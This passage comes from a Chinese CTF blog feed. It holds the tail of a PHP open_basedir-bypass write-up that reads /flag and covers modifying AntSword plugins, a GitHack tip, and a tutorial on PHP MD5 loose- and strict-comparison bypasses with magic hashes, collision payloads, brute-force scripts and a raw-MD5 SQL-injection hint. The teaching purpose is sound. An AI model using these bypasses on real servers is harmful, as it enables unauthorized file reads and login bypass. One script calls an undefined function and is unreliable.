<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir(&#x27;qf&#x27;);chdir(&#x27;qf&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(file_get_contents(&#x27;/flag&#x27;));</span><br></pre></td></tr></table></figure>
<p><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(22).png" alt="image.png"><br>至此，结束了一切。</p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>个人认为非常难，但是也挺偏向实战一点点，起码是一个很符合CTF的题目。主要的难点还是在理解那个php脚本的，要对应好监听的端口和php脚本里面的代码，其实这道题目用蚁剑的插件也可以做出来，不过要修改几个插件的代码。比较懒就不写了<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(23).png" alt="image.png"><br>贴个图证明我真的试过了，要记得改端口，还要把插件里面的函数**fsockopen <strong>改为</strong> pfsockopen **<br>附上修改文件：</p>
<ul>
<li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(24).png" alt="image.png"><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(25).png" alt="image.png"></li>
<li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(26).png" alt="image.png"></li>
<li><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(27).png" alt="image.png"></li>
</ul>
<p>如果是手工操作的话还是要记得对应好端口。<br>不过这个蚁剑最后这些文件是创建成功了，但是连接不上就有点尴尬了.可能是我版本和别人不一样改的也就不行了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Githack无法下载源码的问题</title>
    <url>/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<span id="more"></span>
<p>Githack有个好坑的地方<br />刚开始的时候总是下载不到泄露的<code>php文件</code><br />要扫很多次才有可能下载到,可是要是是真实环境,扫了两遍没有可能就真的觉得没有了,那如何解决呢？<br />于是我进了源码看一下<br /><img src="/./../images/1/1-1.png" alt="image.png"><br />点击进入githack.py并编辑<br /><img src="/./../images/1/1-2.png" alt="image.png"><br />把他线程改低一点就可以了,流量不够大就可以不被拒绝访问<br />就可以下载到源码</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title>MD5碰撞</title>
    <url>/2022/08/23/MD5%E7%A2%B0%E6%92%9E/</url>
    <content><![CDATA[<p><a name="lCJgX"></a></p>
<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在CTF中可以说是经常碰到md5加密了，一般都是进行<code>强比较</code>抑或是<code>弱比较</code>，考法非常多，但是万变不离其中。只要我们掌握了原理，一切问题便迎刃而解了。<br><a name="NGMi1"></a></p>
<span id="more"></span>

<h2 id="简单了解MD5："><a href="#简单了解MD5：" class="headerlink" title="简单了解MD5："></a>简单了解MD5：</h2><ul>
<li>md5是一种加密算法，并且<code>不能防止碰撞破解</code>。</li>
<li>md5加密是不可逆的，这就意味着有<code>两串不同的字符串``加密出来的内容却是相同的</code></li>
<li>加密过程简单，碰撞还原字符难</li>
</ul>
<p><a name="rvOcf"></a></p>
<h2 id="PHP的弱比较："><a href="#PHP的弱比较：" class="headerlink" title="PHP的弱比较："></a>PHP的弱比较：</h2><p>先提两个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==123)</span><br><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong><font color='#ff9900'>不看答案想一下结果会是什么</font></strong></p>
<p>在没有认真总结前，完全不知道弱比较还要区分<code>与**字符串**类型比较</code>还是<code>与int类型比较</code><br>上述实例的结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p><a name="C4062"></a></p>
<h3 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a>字符串与int类型比较:</h3><p>PHP规定当进行<code>字符串与数字的弱比较时</code>，会<code>进行如下步骤</code>：<br>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code><br>如果开头不为数字，则判断为false，即0。因此<br><code>(&quot;aaa123&quot;==0)</code> &#x3D;&gt;<code>true</code><br><code>(&quot;123a&quot;==123)</code> &#x3D;&gt;<code>true</code><br><strong>思维导图：</strong><br><img src="/./../images/2/2-1.png" alt="image.png1"><br><a name="ILEFW"></a></p>
<h3 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a>字符串与字符串比较：</h3><p>正如上面所言：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var_dump(<span class="string">&quot;123a&quot;</span>==<span class="string">&quot;123&quot;</span>);  //False</span><br></pre></td></tr></table></figure>
<p>因为这个是字符串之间进行比较，想要绕过这个弱比较只能用<code>0e</code>的方式。<br>在PHP中”0e”判断为科学计数法，<code>0e123就是0的10123次方</code><br>不难推出：<code>0e123456789==0e1</code> &#x2F;&#x2F; 因为0的任意次方都为0<br>不过有一个注意点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e345&quot;</span>  //True</span><br><span class="line"><span class="string">&quot;0e12adfc&quot;</span>==<span class="string">&quot;0e345&quot;</span>  //False</span><br><span class="line"></span><br><span class="line">在0e后面不能含有字母！！！</span><br><span class="line">在0e后面不能含有字母！！！</span><br><span class="line">在0e后面不能含有字母！！!</span><br><span class="line">否则判断为False</span><br></pre></td></tr></table></figure>
<p>#实例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;0e23253&quot;</span>==<span class="string">&quot;0e2345&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p><a name="eQQch"></a></p>
<h2 id="CTF的MD5弱比较"><a href="#CTF的MD5弱比较" class="headerlink" title="CTF的MD5弱比较"></a>CTF的MD5弱比较</h2><p>在CTF中，会遇到如下的MD5弱比较题目<br><a name="XWV4b"></a></p>
<h3 id="1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$md5_1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>];</span><br><span class="line"><span class="variable">$md5_2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_2</span>) &amp; <span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;try harder&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个时候就要利用<code>0e</code>的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？<br>1.脚本寻找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">CHARS = <span class="keyword">string</span>.ascii_letters + <span class="keyword">string</span>.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">cmp_md5</span>(substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> not stop_event.<span class="title function_ invoke__">is_set</span>():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>(random.<span class="title function_ invoke__">choice</span>(CHARS) <span class="keyword">for</span> _ in <span class="title function_ invoke__">range</span>(size))</span><br><span class="line">        md5 = hashlib.<span class="title function_ invoke__">md5</span>(rnds)</span><br><span class="line">        value = md5.<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="comment"># print rnds</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            md5 = hashlib.<span class="title function_ invoke__">md5</span>(value)</span><br><span class="line">            <span class="keyword">if</span> md5.<span class="title function_ invoke__">hexdigest</span>()[start: start + str_len] == substr:</span><br><span class="line">                <span class="keyword">print</span> rnds + <span class="string">&quot;=&gt;&quot;</span> + value + <span class="string">&quot;=&gt;&quot;</span> + md5.<span class="title function_ invoke__">hexdigest</span>() + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                stop_event.<span class="title function_ invoke__">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].<span class="title function_ invoke__">strip</span>()</span><br><span class="line">    start_pos = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="title function_ invoke__">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.<span class="title function_ invoke__">cpu_count</span>()</span><br><span class="line">    stop_event = multiprocessing.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    processes = [multiprocessing.<span class="title function_ invoke__">Process</span>(target=cmp_md5, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p in processes:</span><br><span class="line">        p.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    <span class="keyword">for</span> p in processes:</span><br><span class="line">        p.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>
<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入命令</span><br><span class="line">python md5.py <span class="string">&quot;0e&quot;</span> 0</span><br><span class="line"><span class="string">&quot;0e&quot;</span> =&gt;要跑的字符</span><br><span class="line"> 0   =&gt;要跑的字符的起始位置</span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-2.png" alt="image.png"><br>脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑<br>2.百度</p>
<table>
<thead>
<tr>
<th>MMHUWUV	    0e701732711630150438129209816536</th>
</tr>
</thead>
<tbody><tr>
<td>MAUXXQC   	0e478478466848439040434801845361</td>
</tr>
<tr>
<td>IHKFRNS	    0e256160682445802696926137988570</td>
</tr>
<tr>
<td>GZECLQZ	    0e537612333747236407713628225676</td>
</tr>
<tr>
<td>GGHMVOE	    0e362766013028313274586933780773</td>
</tr>
<tr>
<td>GEGHBXL	    0e248776895502908863709684713578</td>
</tr>
<tr>
<td>EEIZDOI	    0e782601363539291779881938479162</td>
</tr>
<tr>
<td>DYAXWCA	    0e424759758842488633464374063001</td>
</tr>
</tbody></table>
<p><img src="/./../images/2/2-3.png" alt="image.png"><br>这样子就出flag了<br><a name="ArvDI"></a></p>
<h3 id="2-a-x3D-x3D-md5-a"><a href="#2-a-x3D-x3D-md5-a" class="headerlink" title="2.$a&#x3D;&#x3D;md5($a)"></a>2.$a&#x3D;&#x3D;md5($a)</h3><p>这一类题型要求满足$a是0e开头，且加密后也是0e开头<br>在网上收集了这些结果：</p>
<table>
<thead>
<tr>
<th>0e215962017	0e291242476940776845150308577824</th>
</tr>
</thead>
<tbody><tr>
<td>0e1284838308	   0e708279691820928818722257405159</td>
</tr>
<tr>
<td>0e1137126905	   0e291659922323405260514745084877</td>
</tr>
<tr>
<td>0e807097110	   0e318093639164485566453180786895</td>
</tr>
<tr>
<td>0e730083352      0e870635875304277170259950255928</td>
</tr>
</tbody></table>
<p>弱比较主要就是以上两种类型。<br><a name="UILG2"></a></p>
<h2 id="CTF的MD5强比较"><a href="#CTF的MD5强比较" class="headerlink" title="CTF的MD5强比较"></a>CTF的MD5强比较</h2><p><a name="X5Dcp"></a></p>
<h3 id="1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><p><a name="Ajb8Q"></a></p>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$md5_1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_1&#x27;</span>];</span><br><span class="line"><span class="variable">$md5_2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5_2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_1</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$md5_2</span>) &amp; <span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;try harder&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>md5_1[]=1&amp;md5_2[]=2</code><br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag<br><img src="/./../images/2/2-4.png" alt="image.png"><br><a name="q6lP9"></a></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>两串不一样的字符，加密结果却相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"><span class="variable">$b</span>=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-5.png" alt="image.png"><br>这个我的脚本就跑不出来了，是网上收集的。<br><a name="r2uDz"></a></p>
<h2 id="题目实战："><a href="#题目实战：" class="headerlink" title="题目实战："></a>题目实战：</h2><p><a name="lz95C"></a></p>
<h3 id="1-BJDCTF2020-Easy-MD5"><a href="#1-BJDCTF2020-Easy-MD5" class="headerlink" title="1.[BJDCTF2020]Easy MD5"></a>1.[BJDCTF2020]Easy MD5</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题也是两个解法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">法一：</span><br><span class="line">param1[]=1&amp;param2[]=2</span><br><span class="line">法二：</span><br><span class="line">param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><a name="jh3Lk"></a></p>
<h3 id="2-强网杯2020——Funhash"><a href="#2-强网杯2020——Funhash" class="headerlink" title="2.强网杯2020——Funhash"></a>2.强网杯2020——Funhash</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>] != <span class="title function_ invoke__">hash</span>(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>] || <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>]) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a name="EMcpk"></a></p>
<h4 id="levle-1"><a href="#levle-1" class="headerlink" title="levle 1"></a>levle 1</h4><p>很明显，这种是要md4加密，并且是”0e”+”数字” 加密后还是”0e”+”数字”的形式，上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md4</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">18</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        rnds = <span class="string">&quot;0e&quot;</span>+rnds</span><br><span class="line">        md4 = hashlib.new(<span class="string">&#x27;md4&#x27;</span>, rnds.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        value = md4.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span>(value)</span><br><span class="line">            <span class="keyword">if</span> value[<span class="number">2</span>:].isdigit():</span><br><span class="line">                <span class="built_in">print</span>(rnds)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md4, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()                </span><br></pre></td></tr></table></figure>
<p><img src="/./../images/2/2-6.png" alt="image.png"><br>测试一下，可行<br><img src="/./../images/2/2-7.png" alt="image.png"><br><a name="GT9CN"></a></p>
<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">法一：</span><br><span class="line">hash2[]=1&amp;hash3[]=2</span><br><span class="line">法二：</span><br><span class="line">hash2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;hash3=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<p><a name="Gvn9O"></a></p>
<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><img src="/./../images/2/2-8.png" alt="image.png"><br>结果：<br><img src="/./../images/2/2-9.png" alt="image.png"><br>只要构造 <code>xx &#39;or xxxx</code> 的形式就可以了<br>具体可以看<a href="https://blog.csdn.net/March97/article/details/81222922">这篇文章</a></p>
<p><a name="QMEO5"></a></p>
<h3 id="3-构造特定字符串"><a href="#3-构造特定字符串" class="headerlink" title="3.构造特定字符串"></a>3.构造特定字符串</h3><p>这个是我觉得以后为了避免大家都用现有的收集字符串解题而出的，比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">123</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要构造一个开头是123且后面是字母的字符串：<br>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> rnds</span><br><span class="line">            <span class="built_in">print</span> value</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md4, args=(substr,</span><br><span class="line">                                                               stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
